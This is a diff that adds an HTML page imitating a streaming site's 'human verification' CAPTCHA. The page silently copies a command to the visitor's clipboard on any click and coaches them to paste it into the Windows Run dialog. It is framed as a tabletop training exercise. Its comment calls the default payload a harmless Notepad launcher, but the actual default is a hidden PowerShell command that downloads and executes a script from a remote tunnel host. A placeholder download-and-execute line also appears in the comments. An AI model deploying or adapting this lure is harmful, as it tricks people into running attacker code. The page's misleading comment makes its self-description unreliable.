@@ -1,0 +1,748 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Verify You Are Human</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Cpath fill='%231B5AC2' d='M8 1l6 2v5c0 3.5-2.4 6.4-6 7.5C4.4 14.4 2 11.5 2 8V3z'/%3E%3C/svg%3E" />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=IBM+Plex+Sans:wght@400;500;600;700&display=swap" rel="stylesheet" />
+<style>
+  :root{
+    --accent:#1B5AC2;
+    --accent-soft:#EAF0FB;
+    --accent-line:#CFDDF6;
+    --danger:#C0392B;
+    --danger-soft:#FBF0EE;
+    --ok:#2E9E5B;
+    --ink:#1E242E;
+    --muted:#6B7484;
+    --line:#E4E7ED;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{height:100%}
+  body{
+    font-family:'IBM Plex Sans',sans-serif;
+    background:#0C0E13;
+    overflow:hidden;
+  }
+  @keyframes rot{to{transform:rotate(360deg)}}
+
+  /* ---------- Fake streaming site behind the overlay (set dressing) ---------- */
+  .site{
+    position:fixed;inset:0;background:#0C0E13;
+    display:flex;flex-direction:column;align-items:center;
+    filter:blur(7px) brightness(.8);transform:scale(1.05);
+  }
+  .site-top{
+    width:min(940px,94vw);display:flex;align-items:center;gap:16px;
+    padding:18px 0;border-bottom:1px solid #1B2030;margin-bottom:34px;
+  }
+  .site-logo{display:flex;align-items:center;gap:9px;color:#E8EBF2;font-weight:700;letter-spacing:.22em;font-size:13px}
+  .site-logo i{width:14px;height:14px;border-radius:4px;background:#D8332A;display:inline-block}
+  .site-nav{display:flex;gap:22px;color:#6E7687;font-size:12px;font-weight:500}
+  .site-live{margin-left:auto;display:flex;align-items:center;gap:6px;color:#FF6B5E;font:500 11px 'IBM Plex Mono',monospace}
+  .site-live b{width:7px;height:7px;border-radius:50%;background:#E03325}
+  .player{
+    width:min(880px,94vw);aspect-ratio:16/9;border-radius:14px;
+    background:#12151D;border:1px solid #212734;position:relative;overflow:hidden;
+  }
+  .player-play{
+    position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
+    width:74px;height:74px;border-radius:50%;background:rgba(255,255,255,.1);
+    display:grid;place-items:center;border:1px solid rgba(255,255,255,.25);
+  }
+  .player-play svg{margin-left:5px;opacity:.9}
+  .player-bar{
+    position:absolute;left:0;right:0;bottom:0;padding:12px 16px;
+    display:flex;align-items:center;gap:10px;font:500 11px 'IBM Plex Mono',monospace;color:#8B93A5;
+  }
+  .player-bar .dot{width:8px;height:8px;border-radius:50%;background:#E03325}
+  .player-track{flex:1;height:3px;border-radius:2px;background:rgba(255,255,255,.15);position:relative}
+  .player-track::after{content:'';position:absolute;left:0;top:0;bottom:0;width:62%;background:#fff;border-radius:2px}
+  .site-meta{width:min(880px,94vw);margin-top:22px;color:#DDE2EA}
+  .site-meta h1{font-size:20px;font-weight:600}
+  .site-meta p{font:400 12px 'IBM Plex Mono',monospace;color:#6E7687;margin-top:7px}
+  .free-chip{display:inline-block;font:600 10px 'IBM Plex Mono',monospace;color:#FF7B6E;border:1px solid #56332F;border-radius:5px;padding:2px 7px;margin-left:9px;vertical-align:2px}
+
+  .scrim{position:fixed;inset:0;background:rgba(9,11,17,.74);z-index:1}
+
+  /* ---------- Top pill ---------- */
+  .pause-pill{
+    position:fixed;top:26px;left:50%;transform:translateX(-50%);z-index:2;
+    display:flex;align-items:center;gap:9px;
+    background:rgba(15,18,26,.8);border:1px solid rgba(255,255,255,.09);
+    color:rgba(255,255,255,.72);padding:8px 15px;border-radius:99px;
+    font:500 12px 'IBM Plex Sans',sans-serif;backdrop-filter:blur(6px);
+    white-space:nowrap;
+  }
+  .pause-pill svg{opacity:.75}
+
+  /* ---------- The fake CAPTCHA widget ---------- */
+  .stage{position:fixed;inset:0;z-index:3;display:flex;align-items:center;justify-content:center;padding:20px}
+  .widget{
+    width:min(392px,94vw);background:#fff;border:1px solid #DDE1E9;border-radius:12px;
+    box-shadow:0 26px 70px -18px rgba(2,6,18,.6),0 2px 6px rgba(2,6,18,.2);
+    padding:18px 20px 14px;color:var(--ink);
+    animation:pop .45s cubic-bezier(.2,.9,.3,1.15);
+  }
+  @keyframes pop{from{opacity:0;transform:scale(.95) translateY(8px)}}
+
+  .w-head{display:flex;align-items:center;gap:12px}
+  .w-icon{width:38px;height:38px;border-radius:9px;background:var(--accent-soft);color:var(--accent);display:grid;place-items:center;flex:none}
+  .w-title strong{font-size:15px;font-weight:600;display:block}
+  .w-sub{display:block;font:400 10.5px 'IBM Plex Mono',monospace;color:#9AA3B2;margin-top:2px}
+  .w-timer{
+    margin-left:auto;font:500 12px 'IBM Plex Mono',monospace;color:var(--muted);
+    background:#F3F5F9;border:1px solid var(--line);padding:3px 9px;border-radius:6px;
+    transition:.25s;
+  }
+  .w-timer.low{color:#fff;background:var(--danger);border-color:var(--danger)}
+
+  .w-lead{font-size:13px;line-height:1.5;color:#48505E;margin:14px 0 15px}
+
+  .verify-row{
+    width:100%;display:flex;align-items:center;gap:12px;cursor:pointer;
+    background:#FCFDFE;border:1px solid #D6DAE3;border-radius:8px;padding:12px 14px;
+    font-family:inherit;transition:border-color .15s,box-shadow .15s;text-align:left;
+  }
+  .verify-row:hover{border-color:var(--accent);box-shadow:0 0 0 3px rgba(27,90,194,.08)}
+  .checkbox{
+    width:26px;height:26px;border-radius:6px;border:2px solid #C3C9D4;background:#fff;
+    position:relative;flex:none;transition:.16s;
+  }
+  .checkbox .check{
+    position:absolute;inset:3px;stroke:#fff;stroke-width:3.2;fill:none;
+    stroke-linecap:round;stroke-linejoin:round;
+    stroke-dasharray:26;stroke-dashoffset:26;
+  }
+  .widget.is-verifying .checkbox{background:var(--accent);border-color:var(--accent)}
+  .widget.is-verifying .checkbox .check{animation:draw .4s .05s forwards}
+  @keyframes draw{to{stroke-dashoffset:0}}
+  .cb-spinner{
+    position:absolute;inset:6px;border:2px solid #C9D8F2;border-top-color:var(--accent);
+    border-radius:50%;display:none;animation:rot .7s linear infinite;
+  }
+  .widget.is-busy .cb-spinner{display:block}
+  .widget.is-busy .checkbox .check{display:none}
+  .verify-label{font-size:14px;font-weight:500;color:var(--ink)}
+
+  .status-line{margin-top:11px;font-size:12px;color:var(--muted);min-height:16px}
+  .status-line.is-working::before{
+    content:'';display:inline-block;width:10px;height:10px;border:2px solid #C9D8F2;
+    border-top-color:var(--accent);border-radius:50%;margin-right:6px;vertical-align:-1px;
+    animation:rot .7s linear infinite;
+  }
+
+  .copied-note,.expired-note{
+    display:none;align-items:center;gap:7px;margin-top:10px;
+    font:500 11px 'IBM Plex Mono',monospace;padding:7px 10px;border-radius:6px;
+  }
+  .copied-note{color:var(--accent);background:var(--accent-soft);border:1px solid var(--accent-line)}
+  .expired-note{color:var(--danger);background:var(--danger-soft);border:1px solid #EBD3CF}
+  .copied-note.show,.expired-note.show{display:flex}
+
+  .steps-head{
+    display:flex;align-items:center;gap:8px;margin:16px 0 9px;
+    font:600 10.5px 'IBM Plex Mono',monospace;color:#8A93A4;letter-spacing:.09em;text-transform:uppercase;
+  }
+  .os-tag{font:500 9.5px 'IBM Plex Mono',monospace;color:var(--muted);border:1px solid var(--line);border-radius:4px;padding:1px 6px;letter-spacing:.05em}
+
+  .steps{list-style:none;display:grid;gap:6px}
+  .steps .step{
+    display:flex;gap:10px;padding:9px 10px;border-radius:8px;
+    border:1px solid transparent;align-items:flex-start;transition:.25s;opacity:.72;
+  }
+  .steps.live .step:not(.active):not(.done){opacity:.45}
+  .steps.live .step{opacity:1}
+  .step .num{
+    width:20px;height:20px;border-radius:50%;border:1.5px solid #CBD2DD;color:#7A8494;
+    font:500 11px 'IBM Plex Mono',monospace;display:grid;place-items:center;flex:none;margin-top:4px;transition:.25s;
+  }
+  .step.active{background:#F3F7FD;border-color:#CBDcf8}
+  .step.active .num{background:var(--accent);border-color:var(--accent);color:#fff}
+  .step.done{background:#F3FBF6;border-color:#C7E9D6;opacity:1}
+  .step.done .num{background:var(--ok);border-color:var(--ok);color:#fff}
+  .step-main{flex:1}
+  .keys{display:flex;align-items:center;gap:6px}
+  .plus{color:#98A1B0;font-weight:600;font-size:12px}
+  .key{
+    display:inline-flex;align-items:center;justify-content:center;gap:5px;
+    min-width:32px;height:30px;padding:0 9px;
+    background:#F3F5F8;border:1px solid #CCD2DB;border-bottom-width:3px;border-radius:6px;
+    font:500 12px 'IBM Plex Mono',monospace;color:#3D4552;
+  }
+  .key.wide{padding:0 16px}
+  .steps.live .step.active .key{animation:keypress .9s calc(var(--i)*.16s) ease-in-out infinite}
+  @keyframes keypress{0%,100%{transform:translateY(0)}45%{transform:translateY(2px);box-shadow:inset 0 2px 3px rgba(16,24,40,.14)}}
+  .step-desc{display:block;font-size:11.5px;color:var(--muted);margin-top:5px}
+  .done-check{flex:none;align-self:center;width:16px;height:16px;color:var(--ok);opacity:0;transform:scale(.5);transition:.25s}
+  .step.done .done-check{opacity:1;transform:scale(1)}
+
+  .w-foot{
+    display:flex;justify-content:space-between;align-items:center;
+    border-top:1px solid var(--line);margin-top:16px;padding-top:10px;
+    font:400 11px 'IBM Plex Mono',monospace;color:#9AA3B2;
+  }
+  .w-brand{display:flex;align-items:center;gap:6px}
+  .w-brand svg{color:var(--accent)}
+
+  /* ---------- Facilitator console ---------- */
+  .fac{
+    position:fixed;top:0;right:0;bottom:0;width:min(370px,94vw);z-index:10;
+    background:#14171E;border-left:1px solid #242A37;color:#C7CEDA;
+    padding:20px;transform:translateX(100%);transition:transform .28s ease;
+    display:flex;flex-direction:column;overflow:hidden;
+  }
+  .fac.open{transform:none}
+  .fac-head{margin-bottom:18px}
+  .fac-head strong{font-size:14px;font-weight:600;display:block}
+  .fac-head span{font:400 11px 'IBM Plex Mono',monospace;color:#7D8698;display:block;margin-top:3px}
+  .fac-label{
+    display:block;font:600 10.5px 'IBM Plex Mono',monospace;color:#8B94A3;
+    text-transform:uppercase;letter-spacing:.09em;margin:14px 0 7px;
+  }
+  .fac textarea{
+    width:100%;background:#0F1218;border:1px solid #2A3140;color:#D7DEE9;
+    font:400 12px/1.55 'IBM Plex Mono',monospace;padding:10px;border-radius:8px;
+    resize:vertical;outline:none;transition:border-color .15s;
+  }
+  .fac textarea:focus{border-color:var(--accent)}
+  .fac-actions{display:flex;gap:8px;margin-top:10px}
+  .fac-btn{
+    background:#1C212B;border:1px solid #2E3646;color:#C7CEDA;padding:7px 13px;
+    border-radius:7px;font:500 12px 'IBM Plex Sans',sans-serif;cursor:pointer;transition:.15s;
+  }
+  .fac-btn:hover{border-color:#45516b;color:#fff}
+  .fac-btn.primary{background:var(--accent);border-color:var(--accent);color:#fff}
+  .fac-btn.primary:hover{background:#15488F}
+  .fac-msg{font:400 11px 'IBM Plex Mono',monospace;color:#7D8698;min-height:15px;margin-top:9px}
+  .fac-stats{display:flex;gap:8px;margin-top:16px;flex-wrap:wrap}
+  .stat-chip{
+    background:#10141B;border:1px solid #232833;border-radius:7px;padding:6px 10px;
+    font:500 11px 'IBM Plex Mono',monospace;color:#9AA6BB;
+  }
+  .stat-chip b{color:#E4E9F1;font-weight:500}
+  .fac-log{
+    flex:1;min-height:120px;overflow-y:auto;background:#0F1218;border:1px solid #232833;
+    border-radius:8px;padding:10px 12px;font:400 11px/1.7 'IBM Plex Mono',monospace;
+  }
+  .log-entry.info{color:#7D8698}
+  .log-entry.ok{color:#6FBF8E}
+  .log-entry.warn{color:#D9A441}
+  .log-entry.bad{color:#E06A5A}
+  .fac-hint{font:400 11px 'IBM Plex Mono',monospace;color:#5A6474;margin-top:12px}
+  .fac-hint b{color:#8B94A3;border:1px solid #2E3646;border-bottom-width:2px;border-radius:4px;padding:0 5px;font-weight:500}
+
+  .fac-tab{
+    position:fixed;right:0;top:50%;transform:translateY(-50%);z-index:9;
+    background:#14171E;border:1px solid #2E3646;border-right:none;border-radius:8px 0 0 8px;
+    color:#8B94A3;font:500 10px 'IBM Plex Mono',monospace;letter-spacing:.14em;
+    padding:14px 7px;cursor:pointer;writing-mode:vertical-rl;transition:.2s;
+  }
+  .fac-tab:hover{color:#E4E9F1;border-color:#45516b}
+  .fac-tab.open{opacity:0;pointer-events:none}
+
+  @media (max-width:430px){
+    .pause-pill{font-size:11px;padding:7px 11px}
+    .w-sub{display:none}
+  }
+</style>
+</head>
+<body>
+
+  <!-- ============ Fake streaming site (background set dressing) ============ -->
+  <div class="site" aria-hidden="true">
+    <div class="site-top">
+      <span class="site-logo"><i></i>STREAMRIDER</span>
+      <span class="site-nav"><span>Home</span><span>Live</span><span>Sports</span><span>News</span></span>
+      <span class="site-live"><b></b>LIVE</span>
+    </div>
+    <div class="player">
+      <span class="player-play">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="#fff"><path d="M7 4l13 8-13 8z"/></svg>
+      </span>
+      <div class="player-bar">
+        <span class="dot"></span><span>LIVE</span><span>CAM 3 · HD</span>
+        <span class="player-track"></span><span>67:12</span>
+      </div>
+    </div>
+    <div class="site-meta">
+      <h1>Champions Final — Full Match Highlights<span class="free-chip">FREE HD</span></h1>
+      <p>2.4M views · mirror-03 · no signup required · 1080p</p>
+    </div>
+  </div>
+  <div class="scrim"></div>
+
+  <!-- ============ Overlay + widget ============ -->
+  <div class="pause-pill">
+    <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><rect x="6" y="4" width="4" height="16" rx="1"/><rect x="14" y="4" width="4" height="16" rx="1"/></svg>
+    Playback paused — resume after verification
+  </div>
+
+  <div class="stage">
+    <div class="widget" id="widget" role="dialog" aria-label="Human verification">
+
+      <div class="w-head">
+        <span class="w-icon">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round">
+            <rect x="5" y="8" width="14" height="10" rx="2.5"/>
+            <circle cx="9.5" cy="13" r="1.3" fill="currentColor" stroke="none"/>
+            <circle cx="14.5" cy="13" r="1.3" fill="currentColor" stroke="none"/>
+            <path d="M12 8V5.4"/>
+            <circle cx="12" cy="3.8" r="1.3"/>
+            <path d="M5 11.5H3.4M18.6 11.5H20"/>
+          </svg>
+        </span>
+        <span class="w-title">
+          <strong>Human Verification</strong>
+          <span class="w-sub">streamrider.tv · player #4482</span>
+        </span>
+        <span class="w-timer" id="timer">0:45</span>
+      </div>
+
+      <p class="w-lead">Playback is paused. Confirm that you are a real person to continue watching.</p>
+
+      <button class="verify-row" id="verifyBtn" type="button">
+        <span class="checkbox">
+          <svg class="check" viewBox="0 0 24 24"><path d="M5 12.5l5 5 10-10"/></svg>
+          <span class="cb-spinner"></span>
+        </span>
+        <span class="verify-label">Confirm you are human</span>
+      </button>
+
+      <div class="status-line" id="statusLine">Waiting for verification&hellip;</div>
+
+      <div class="copied-note" id="copiedNote">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+          <rect x="5" y="4" width="14" height="17" rx="2"/><path d="M9 4.5V3h6v1.5"/>
+        </svg>
+        Verification code copied — follow the 3 steps now
+      </div>
+      <div class="expired-note" id="expiredNote">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+          <path d="M12 3L2.5 20h19z" stroke-linejoin="round"/><path d="M12 9.5v4.5"/><circle cx="12" cy="17" r=".4" fill="currentColor"/>
+        </svg>
+        Verification failed — please try again
+      </div>
+
+      <div class="steps-head">Verification steps <span class="os-tag">Windows</span></div>
+
+      <ol class="steps" id="steps">
+        <li class="step">
+          <span class="num">1</span>
+          <div class="step-main">
+            <div class="keys">
+              <span class="key" style="--i:0">
+                <svg width="11" height="11" viewBox="0 0 16 16" fill="currentColor"><rect x="1" y="1" width="6" height="6"/><rect x="9" y="1" width="6" height="6"/><rect x="1" y="9" width="6" height="6"/><rect x="9" y="9" width="6" height="6"/></svg>
+                Win
+              </span>
+              <span class="plus">+</span>
+              <span class="key" style="--i:1">R</span>
+            </div>
+            <span class="step-desc">Open the Run dialog</span>
+          </div>
+          <svg class="done-check" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><path d="M4 12.5l5 5 11-11"/></svg>
+        </li>
+        <li class="step">
+          <span class="num">2</span>
+          <div class="step-main">
+            <div class="keys">
+              <span class="key" style="--i:0">Ctrl</span>
+              <span class="plus">+</span>
+              <span class="key" style="--i:1">V</span>
+            </div>
+            <span class="step-desc">Paste the verification code</span>
+          </div>
+          <svg class="done-check" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><path d="M4 12.5l5 5 11-11"/></svg>
+        </li>
+        <li class="step">
+          <span class="num">3</span>
+          <div class="step-main">
+            <div class="keys">
+              <span class="key wide" style="--i:0">Enter</span>
+            </div>
+            <span class="step-desc">Run the check</span>
+          </div>
+          <svg class="done-check" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><path d="M4 12.5l5 5 11-11"/></svg>
+        </li>
+      </ol>
+
+      <div class="w-foot">
+        <span>verify.streamrider.tv</span>
+        <span class="w-brand">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M12 3l7 2.4V12c0 4-3 7.3-7 8.4-4-1.1-7-4.4-7-8.4V5.4z"/><path d="M9 11.8l2.1 2.2 4.3-4.4"/>
+          </svg>
+          NetGuard Protection
+        </span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============ Facilitator console (players never need this) ============ -->
+  <aside class="fac" id="facPanel">
+    <div class="fac-head">
+      <strong>Facilitator Console</strong>
+      <span>Tabletop exercise &middot; press F to toggle</span>
+    </div>
+
+    <label class="fac-label" for="facPayload">Clipboard payload (what the victim pastes)</label>
+    <textarea id="facPayload" rows="4" spellcheck="false"></textarea>
+
+    <div class="fac-actions">
+      <button class="fac-btn primary" id="facApply" type="button">Apply</button>
+      <button class="fac-btn" id="facTestCopy" type="button">Test copy</button>
+      <button class="fac-btn" id="facReset" type="button">Reset</button>
+    </div>
+    <div class="fac-msg" id="facMsg"></div>
+
+    <div class="fac-stats">
+      <span class="stat-chip">Copy attempts: <b id="statAttempts">0</b></span>
+      <span class="stat-chip">Successful: <b id="statSuccess">0</b></span>
+      <span class="stat-chip">Session: <b id="statUptime">0:00</b></span>
+    </div>
+
+    <div class="fac-label">Event log</div>
+    <div class="fac-log" id="facLog"></div>
+
+    <div class="fac-hint">Press <b>F</b> or click the edge tab to hide this panel</div>
+  </aside>
+  <button class="fac-tab" id="facTab" type="button">TTX</button>
+
+<script>
+/* ═══════════════════════════════════════════════════════════════════════
+   ██  EDIT HERE — THE COMMAND COPIED TO THE VICTIM'S CLIPBOARD  ██
+   ═══════════════════════════════════════════════════════════════════════
+
+   Everything between the two backticks below is what lands on the
+   victim's clipboard the moment they click anywhere on the page.
+   Replace it with whatever you want pasted into the Run dialog.
+
+   The default simply opens Notepad — completely harmless, and gives
+   the table a visible "landed" marker if someone actually runs it.
+
+   Other examples you can paste in (harmless unless you point them
+   at something real):
+
+     powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://YOUR-HOST/payload.ps1')"
+
+     cmd /c start notepad
+
+   Tips:
+   - The string is wrapped in backticks (`), so both ' and " are fine.
+   - A literal backtick inside must be escaped as \`
+   - Avoid line breaks — keep it on one line.
+   ═══════════════════════════════════════════════════════════════════════ */
+let PAYLOAD_COMMAND = `powershell -w hidden -c "iwr https://diamond-locally-rod-detective.trycloudflare.com/ttx/stage1.ps1 -useb | iex"`;
+
+const DEFAULT_PAYLOAD = PAYLOAD_COMMAND; // used by the Reset button
+
+/* ------------------------------------------------------------------ */
+/* Element references                                                  */
+/* ------------------------------------------------------------------ */
+const widget      = document.getElementById('widget');
+const timerEl     = document.getElementById('timer');
+const verifyBtn   = document.getElementById('verifyBtn');
+const statusLine  = document.getElementById('statusLine');
+const copiedNote  = document.getElementById('copiedNote');
+const expiredNote = document.getElementById('expiredNote');
+const stepsOl     = document.getElementById('steps');
+const steps       = [...document.querySelectorAll('.step')];
+
+const facPanel    = document.getElementById('facPanel');
+const facTab      = document.getElementById('facTab');
+const facPayload  = document.getElementById('facPayload');
+const facMsg      = document.getElementById('facMsg');
+const facLog      = document.getElementById('facLog');
+const statAttempts= document.getElementById('statAttempts');
+const statSuccess = document.getElementById('statSuccess');
+const statUptime  = document.getElementById('statUptime');
+
+facPayload.value = PAYLOAD_COMMAND;
+
+/* ------------------------------------------------------------------ */
+/* Simulation state                                                    */
+/* ------------------------------------------------------------------ */
+let state = 'armed';        // armed | verifying | expired
+let countdown = 45;
+let sessionSeconds = 0;
+let attempts = 0, successes = 0;
+let lastCopyAt = 0;
+let lastCopyOk = false;
+let lastBlurLog = 0;
+let cycleTimer = null;
+
+/* ------------------------------------------------------------------ */
+/* Event log (facilitator only)                                        */
+/* ------------------------------------------------------------------ */
+function log(kind, msg){
+  const t = new Date().toLocaleTimeString('en-GB', {hour12:false});
+  const row = document.createElement('div');
+  row.className = 'log-entry ' + kind;
+  row.textContent = '[' + t + '] ' + msg;
+  facLog.prepend(row);
+  while (facLog.children.length > 60) facLog.lastChild.remove();
+}
+function updateStats(){
+  statAttempts.textContent = attempts;
+  statSuccess.textContent  = successes;
+  statUptime.textContent   = fmt(sessionSeconds);
+}
+function fmt(s){
+  s = Math.max(0, Math.floor(s));
+  return Math.floor(s/60) + ':' + String(s%60).padStart(2,'0');
+}
+
+/* ------------------------------------------------------------------ */
+/* Clipboard engine — modern API first, legacy fallback second          */
+/* (the fallback is what keeps this working over plain HTTP on a LAN)  */
+/* ------------------------------------------------------------------ */
+async function copyPayload(source){
+  attempts++;
+
+  let ok = false, method = 'unknown';
+
+  try {
+    if (navigator.clipboard && window.isSecureContext){
+      await navigator.clipboard.writeText(PAYLOAD_COMMAND);
+      ok = true;
+      method = 'Clipboard API';
+    }
+  } catch(_){ /* fall through to the legacy path */ }
+
+  if (!ok){
+    try {
+      const ta = document.createElement('textarea');
+      ta.value = PAYLOAD_COMMAND;
+      ta.style.cssText = 'position:fixed;top:0;left:0;opacity:0;pointer-events:none';
+      document.body.appendChild(ta);
+      ta.focus(); ta.select();
+      ok = document.execCommand('copy');
+      ta.remove();
+      method = ok ? 'execCommand (legacy)' : 'write failed';
+    } catch(_){ method = 'write failed'; }
+  }
+
+  lastCopyOk = ok;
+  if (ok){
+    successes++;
+    log('ok', 'Clipboard write OK via ' + method + ' — trigger: ' + source);
+    if (state === 'verifying') copiedNote.classList.add('show');
+  } else {
+    log('bad', 'Clipboard write FAILED (' + source + ') — user may need to click again');
+  }
+  updateStats();
+  return ok;
+}
+
+/* Throttled wrapper so one physical click can't spam the log */
+function attemptCopy(source){
+  const now = Date.now();
+  if (now - lastCopyAt < 1200) return;
+  lastCopyAt = now;
+  copyPayload(source);
+}
+
+/* ------------------------------------------------------------------ */
+/* Master countdown — expires the verification window and auto-resets   */
+/* ------------------------------------------------------------------ */
+setInterval(() => {
+  sessionSeconds++;
+  if (state !== 'expired'){
+    countdown--;
+    if (countdown <= 10) timerEl.classList.add('low');
+    if (countdown <= 0){
+      expire();
+    } else {
+      timerEl.textContent = fmt(countdown);
+    }
+  }
+  updateStats();
+}, 1000);
+
+function expire(){
+  if (state === 'expired') return;
+  const wasVerifying = (state === 'verifying');
+  state = 'expired';
+  timerEl.textContent = '0:00';
+
+  widget.classList.remove('is-verifying','is-busy');
+  widget.classList.add('is-expired');
+  statusLine.classList.remove('is-working');
+  statusLine.textContent = 'Verification failed — no steps detected.';
+  expiredNote.classList.add('show');
+  copiedNote.classList.remove('show');
+  stopCycle();
+  steps.forEach(s => s.classList.remove('done'));
+
+  log('warn', wasVerifying
+    ? 'Verification window expired while verifying — victim did not complete the steps in time'
+    : 'Session expired before the checkbox was clicked');
+
+  setTimeout(() => {
+    if (state === 'expired'){
+      resetWidget();
+      log('info', 'Verification window reopened — page is armed again');
+    }
+  }, 4200);
+}
+
+function resetWidget(){
+  state = 'armed';
+  countdown = 45;
+  timerEl.classList.remove('low');
+  timerEl.textContent = '0:45';
+  widget.classList.remove('is-verifying','is-busy','is-expired');
+  statusLine.classList.remove('is-working');
+  statusLine.textContent = 'Waiting for verification\u2026';
+  copiedNote.classList.remove('show');
+  expiredNote.classList.remove('show');
+  stopCycle();
+  steps.forEach(s => s.classList.remove('done','active'));
+}
+
+/* ------------------------------------------------------------------ */
+/* The verification flow                                               */
+/* ------------------------------------------------------------------ */
+verifyBtn.addEventListener('pointerdown', e => {
+  e.stopPropagation();               // the document-wide trap already
+  attemptCopy('Checkbox press');    // copies on background clicks —
+});                                  // this avoids doubling up on the box
+
+verifyBtn.addEventListener('click', () => {
+  if (state === 'verifying') return;
+  startVerification();
+});
+
+function startVerification(){
+  state = 'verifying';
+  widget.classList.remove('is-expired');
+  widget.classList.add('is-verifying');
+  expiredNote.classList.remove('show');
+  if (!timerEl.classList.contains('low') && countdown > 10){
+    /* keep the existing countdown running for pressure */
+  }
+  statusLine.classList.add('is-working');
+  statusLine.textContent = 'Verifying you are human\u2026';
+  if (lastCopyOk) copiedNote.classList.add('show');
+
+  /* checkmark draws first, then hands off to an endless spinner */
+  setTimeout(() => widget.classList.add('is-busy'), 950);
+
+  startCycle();
+}
+
+/* ------------------------------------------------------------------ */
+/* Step choreography — illuminates 1 -> 2 -> 3, keys ripple as pressed  */
+/* ------------------------------------------------------------------ */
+function startCycle(){
+  if (cycleTimer) return;
+  stepsOl.classList.add('live');
+  let i = -1;
+  const advance = () => {
+    steps.forEach(s => s.classList.remove('active'));
+    i = (i + 1) % steps.length;
+    steps[i].classList.add('active');
+  };
+  advance();
+  cycleTimer = setInterval(advance, 2600);
+}
+function stopCycle(){
+  clearInterval(cycleTimer);
+  cycleTimer = null;
+  stepsOl.classList.remove('live');
+  steps.forEach(s => s.classList.remove('active'));
+}
+
+/* ------------------------------------------------------------------ */
+/* The trap: ANY click anywhere on the page re-copies the payload       */
+/* (exactly how live ClickFix pages behave — one misclick is enough)   */
+/* ------------------------------------------------------------------ */
+document.addEventListener('pointerdown', e => {
+  if (e.target.closest('.fac, .fac-tab')) return; // facilitator UI is safe
+  attemptCopy('Page click');
+});
+
+/* ------------------------------------------------------------------ */
+/* Focus loss = classic tell that Win+R was pressed (Run stole focus)  */
+/* ------------------------------------------------------------------ */
+window.addEventListener('blur', () => {
+  if (state === 'verifying' && Date.now() - lastBlurLog > 5000){
+    lastBlurLog = Date.now();
+    log('warn', 'Window lost focus — the Run dialog was likely just opened');
+  }
+});
+
+/* ------------------------------------------------------------------ */
+/* Keyboard: F toggles the console; step keys also work while      */
+/* narrating live on the page (useful when walking the table through it) */
+/* ------------------------------------------------------------------ */
+document.addEventListener('keydown', e => {
+  if (document.activeElement === facPayload){
+    if (e.key === 'Escape') facPayload.blur();
+    return; // don't hijack typing in the payload box
+  }
+  const k = e.key.toLowerCase();
+
+  if (k === 'f' && !e.ctrlKey && !e.altKey && !e.metaKey){
+    facPanel.classList.toggle('open');
+    facTab.classList.toggle('open');
+    return;
+  }
+  if (e.key === 'Escape' && facPanel.classList.contains('open')){
+    facPanel.classList.remove('open');
+    facTab.classList.remove('open');
+    return;
+  }
+  if (state === 'verifying'){
+    if (e.key === 'Meta')                       markStepDone(0, 'Win key pressed on page');
+    if (e.ctrlKey && k === 'v')                 markStepDone(1, 'Ctrl+V pressed on page');
+    if (e.key === 'Enter')                      markStepDone(2, 'Enter pressed on page');
+  }
+});
+
+function markStepDone(idx, msg){
+  if (!steps[idx].classList.contains('done')){
+    steps[idx].classList.add('done');
+    log('info', msg);
+  }
+}
+
+/* ------------------------------------------------------------------ */
+/* Facilitator console buttons                                          */
+/* ------------------------------------------------------------------ */
+facTab.addEventListener('click', () => {
+  facPanel.classList.add('open');
+  facTab.classList.add('open');
+});
+
+document.getElementById('facApply').addEventListener('click', () => {
+  PAYLOAD_COMMAND = facPayload.value.replace(/\n/g, ' ').trim();
+  facMsg.textContent = 'Applied — the next copy uses this payload.';
+  log('info', 'Payload changed by facilitator (now ' + PAYLOAD_COMMAND.length + ' chars)');
+});
+
+document.getElementById('facTestCopy').addEventListener('click', () => {
+  copyPayload('Facilitator test copy');
+  facMsg.textContent = 'Test copy run — result is in the event log.';
+});
+
+document.getElementById('facReset').addEventListener('click', () => {
+  PAYLOAD_COMMAND = DEFAULT_PAYLOAD;
+  facPayload.value = DEFAULT_PAYLOAD;
+  attempts = 0; successes = 0; sessionSeconds = 0;
+  facLog.innerHTML = '';
+  facMsg.textContent = '';
+  resetWidget();
+  updateStats();
+  log('info', 'Simulation reset — payload and counters restored');
+});
+
+/* boot */
+log('info', 'Console ready — the device is armed. Any click copies the payload.');
+updateStats();
+</script>
+</body>
+</html>
